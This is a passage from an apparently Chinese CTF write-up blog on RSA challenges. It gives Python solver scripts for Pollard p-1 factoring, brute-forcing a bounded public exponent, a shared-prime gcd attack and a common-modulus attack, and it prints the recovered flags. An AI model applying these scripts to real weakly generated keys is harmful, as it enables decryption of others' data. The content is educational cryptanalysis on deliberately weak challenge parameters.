punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        n <span class="token operator">=</span> <span class="token number">2</span>        <span class="token keyword">while</span> n<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> bits<span class="token punctuation">:</span>            n <span class="token operator">*=</span> choice<span class="token punctuation">(</span>primes<span class="token punctuation">)</span>        <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>primes<span class="token punctuation">)</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>p<span class="token punctuation">,</span> q <span class="token operator">=</span> <span class="token punctuation">[</span>getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qc <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token comment"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span><span class="token comment"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>from Cryptodome.Util.number import isPrime, sieve_base as primes</code>，这里的primes是前10000个素数，可以看到p和q是基于这前10000个素数的随机取出的乘积最后加一生成。</p><p>费马小定理可以扩展为</p><script type="math/tex; mode=display">a^{t \times (p-1)} – 1 = k\times p</script><p>其中，a不是p的倍数，t、k是正整数。</p><p>又由上可知：</p><script type="math/tex; mode=display">若L=t\times (p-1)\\\\则a^L – 1 = k\times p</script><p>所以</p><script type="math/tex; mode=display">a^L-1是p的倍数</script><p>而又因为</p><script type="math/tex; mode=display">n=p\times q</script><p>故n也是p的倍数，所以p是n与a^L-1的最小公约数，所以求p只需</p><script type="math/tex; mode=display">gcd(a^L-1,n)</script><p>手里有n，a可以从2开始，那L怎么来呢？</p><p>由<code>Pollard&#39; p-1 method</code></p><p>如果<code>p-1</code>正好是一些很小的质数的乘积，那么<code>p-1</code>就能整除n!，其中n是一个不太大的数。</p><p>那么</p><script type="math/tex; mode=display">L=n!\\\\只要求p = gcd(a^{n!}-1,n)\\\\如果满足1<p<n\\\\应该就能说p是n的因数</script><p>生成算法如下，其中令a为从2开始的数。</p><p><img src="/2020/11/25/BUUOJ-crypto/image-20210504002752365.png" alt="image-20210504002752365"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> random <span class="token keyword">import</span> choice<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> isPrime<span class="token punctuation">,</span> sieve_base <span class="token keyword">as</span> primesN <span class="token operator">=</span> <span class="token number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span><span class="token keyword">def</span> <span class="token function">Pollard_p_1</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token number">5</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> a        <span class="token comment"># precompute</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">80000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            f <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> n<span class="token punctuation">,</span> N<span class="token punctuation">)</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">80000</span><span class="token punctuation">,</span> <span class="token number">104729</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            f <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> n<span class="token punctuation">,</span> N<span class="token punctuation">)</span>            <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">15</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>f<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token number">1</span> <span class="token operator">&lt;</span> d <span class="token operator">&lt;</span> N<span class="token punctuation">:</span>                    <span class="token keyword">return</span> d        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>        a <span class="token operator">+=</span> <span class="token number">1</span>p <span class="token operator">=</span> Pollard_p_1<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面是优化过后的官方代码，虽然我看不太懂，但是下次出了类似的factordb接不出来的话，也可以用上面的脚本爆破。</p><p>解出的p</p><pre class="line-numbers language-none"><code class="language-none">p&#x3D;178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后解一下m即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span>p <span class="token operator">=</span> <span class="token number">178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139</span>c <span class="token operator">=</span> <span class="token number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span><span class="token comment"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span><span class="token comment"># b'NCTF&#123;Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3&#125;'</span><span class="token comment"># flag&#123;Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10-RSA给出e范围，爆破e-HDCTF2019-bbbbbbrsa"><a href="#10-RSA给出e范围，爆破e-HDCTF2019-bbbbbbrsa" class="headerlink" title="10.RSA给出e范围，爆破e-[HDCTF2019]bbbbbbrsa"></a>10.RSA给出e范围，爆破e-[HDCTF2019]bbbbbbrsa</h2><p>给出了e的范围为</p><script type="math/tex; mode=display">50000<e<70000</script><p>对e爆破即可，下面是脚本，环境为<strong><code>python27</code></strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">import</span> sys<span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> io    sys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> io<span class="token punctuation">.</span>TextIOWrapper<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment"># 请不要删除上方代码，否则包含中文时无法运行</span><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode <span class="token keyword">as</span> b32encode<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode <span class="token keyword">as</span> b32decode<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token punctuation">,</span> gcd<span class="token punctuation">,</span> iroot<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> binascii <span class="token keyword">import</span> a2b_hex<span class="token punctuation">,</span> b2a_hex<span class="token keyword">import</span> random<span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">177077389675257695042507998165006460849</span>n <span class="token operator">=</span> <span class="token number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span>c <span class="token operator">=</span> <span class="token string">'==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM'</span>flag <span class="token operator">=</span> <span class="token string">"******************************"</span><span class="token triple-quoted-string string">"""nbit = 128p = getPrime(nbit)q = getPrime(nbit)n = p * qprint(p)print(n)"""</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>c <span class="token operator">=</span> b32decode<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>e <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">50000</span><span class="token punctuation">,</span> <span class="token number">70000</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            e <span class="token operator">-=</span> <span class="token number">1</span>    d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        <span class="token keyword">print</span> flag    <span class="token keyword">if</span> e <span class="token operator">&lt;</span> <span class="token number">50000</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    e <span class="token operator">-=</span> <span class="token number">1</span><span class="token comment"># c = pow(int(b2a_hex(flag), 16), e, n)</span><span class="token comment"># print b32encode(str(c))[::-1]</span><span class="token comment"># c = 2373740699529364991763589324200093466206785561836101840381622237225512234632</span><span class="token comment"># flag&#123;rs4_1s_s1mpl3!#&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-RSA两次加密n有公因数、e不变且可求-BJDCTF2020-RSA"><a href="#11-RSA两次加密n有公因数、e不变且可求-BJDCTF2020-RSA" class="headerlink" title="11.RSA两次加密n有公因数、e不变且可求-[BJDCTF2020]RSA"></a>11.RSA两次加密n有公因数、e不变且可求-[BJDCTF2020]RSA</h2><p>分析代码，注意到针对相同的指数e进行了分开的两次加密，而这两次加密之中的q未变，这就很危险了，我们可以直接对两次的n求gcd，最大公约数一定就是q，由此又得两次的p，又因为e本身不变，第二次的明密文我们都知道，从而求得e，进而求得第一次加密的私钥d，进而求得明文m。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">import</span> sys<span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> io    sys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> io<span class="token punctuation">.</span>TextIOWrapper<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment"># 请不要删除上方代码，否则包含中文时无法运行</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token triple-quoted-string string">'''# flag = open("flag", "rb").read()flag = 'test'e = 65537p = getPrime(1024)q = getPrime(1024)assert (e &lt; 100000)n = p * qm = bytes_to_long(flag)c = pow(m, e, n)print c, nprint pow(294, e, n)p = getPrime(1024)n = p * qm = bytes_to_long("BJD" * 32)c = pow(m, e, n)print c, noutputspan>temp <span class="token operator">=</span> <span class="token number">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span>c1 <span class="token operator">=</span> <span class="token number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span>n1 <span class="token operator">=</span> <span class="token number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span>c2 <span class="token operator">=</span> <span class="token number">979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721</span>n2 <span class="token operator">=</span> <span class="token number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>p1<span class="token punctuation">,</span> p2 <span class="token operator">=</span> n1 <span class="token operator">//</span> q<span class="token punctuation">,</span> n2 <span class="token operator">//</span> q<span class="token comment"># 下面的这个爆破因为给了两组可爆破的对象，我选择了简单点的那一个</span><span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> temp <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">294</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span> <span class="token string">'e='</span><span class="token punctuation">,</span> ephi1 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi1<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span> flag<span class="token triple-quoted-string string">"""e= 52361BJD&#123;p_is_common_divisor&#125;flag&#123;p_is_common_divisor&#125;"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12-RSA共模攻击-BJDCTF2020-rsa-output"><a href="#12-RSA共模攻击-BJDCTF2020-rsa-output" class="headerlink" title="12.RSA共模攻击-[BJDCTF2020]rsa_output"></a>12.RSA共模攻击-[BJDCTF2020]rsa_output</h2><p>给出的output很明显就是上面的两条数据是公钥对，下面的两条是密文信息，很明显，两个公钥对的模数n是相同的。攻击原理基于<code>贝祖等式</code></p><p>这里就不在分析代码了，也不是特别难，知道贝祖等式的原理之后是很简单的<a href="https://blog.csdn.net/Qi2456/article/details/79887411">贝祖等式原理</a></p><pre class="line-numbers language-py" data-language="py"><code class="language-py"><span class="token comment"># 输入a、b为互素的两个模指数，输出为s、t和q，q一般为1</span><span class="token keyword">def</span> <span class="token function">ext_euclid</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a     <span class="token keyword">else</span><span class="token punctuation">:</span>         x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span> <span class="token comment"># q = gcd(a, b) = gcd(b, a%b)</span>         x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>         <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面分析一下共模攻击的原理</p><script type="math/tex; mode=display">\because s\times a+  t\times b=1\left ( 根据贝祖等式，gcd(a, b)=1 \right ) \\\\得出的结果肯定是s、t为异号的两个数。\\\\\therefore s \times e1+  t\times e2=1</script><p>下面分析为何没有私钥也能获得明文。</p><script type="math/tex; mode=display">(c1^{s} \times  c2^{t}) \bmod n\\\\=  (m^{e1} \bmod n)^{s} \times (m^{e2} \bmod n)^{t} \bmod n \\\\=  m^{(e1 \times s + e2 \times t)} \bmod n \\\\=  m \bmod n \\\\=  m \\\\</script><p>c1、c2代换很显然，最后得出的m就是明文。</p><p>所以有下面<code>共模攻击的脚本</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span 